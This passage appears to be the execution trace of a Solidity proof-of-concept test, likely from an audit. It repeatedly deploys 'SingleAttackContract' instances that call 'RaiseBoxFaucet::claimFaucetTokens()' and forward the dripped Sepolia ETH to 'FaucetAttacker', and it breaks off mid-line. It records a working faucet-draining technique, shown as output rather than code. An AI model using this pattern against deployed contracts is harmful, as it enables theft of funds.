    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x488E3A6131Dd7E9130A7dF0BF3e90EAcf7ce604D
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 77) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2660710] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2659951] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2623783] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2616125] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 610000000000000000 [6.1e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xf6E0C8564C7F2753c2cfBb0aCd87aFD2a1916641
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 78) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2358741] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2357982] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2321814] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2314156] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] 